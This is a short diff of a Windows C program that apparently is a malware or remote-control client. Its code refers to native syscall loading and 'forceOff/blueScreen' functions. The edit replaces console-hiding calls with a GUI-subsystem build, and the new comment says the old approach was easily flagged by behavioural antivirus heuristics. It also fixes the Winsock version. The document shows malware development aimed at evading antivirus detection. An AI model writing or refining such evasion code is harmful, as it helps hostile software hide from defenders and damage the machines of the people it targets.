@@ -106,14 +106,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     if (!ntcalls_load()) return 0x02;
     ntcalls_verify();  /* non-fatal; only forceOff/blueScreen need it    */
 
-    /* ── 3. Hide console window ──────────────────────────────────────── */
-    /* BUG 4: GetConsoleWindow() return was not NULL-guarded             */
-    AllocConsole();
-    HWND hConsole = GetConsoleWindow();
-    if (hConsole) ShowWindow(hConsole, SW_HIDE);
-
-    /* ── 4. Winsock 2.2 ──────────────────────────────────────────────── */
-    /* BUG 2: was MAKEWORD(2,0)                                          */
+    /* ── 3. Winsock 2.2 ──────────────────────────────────────────────── */
+    /* No AllocConsole/ShowWindow needed — the binary is built with      */
+    /* /SUBSYSTEM:WINDOWS (-mwindows) so the OS never allocates a        */
+    /* console window.  AllocConsole + ShowWindow(SW_HIDE) was noisy     */
+    /* and easily flagged by behavioural AV heuristics.                  */
+    /* (was MAKEWORD(2,0) — fixed to MAKEWORD(2,2))                      */
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0x03;
 
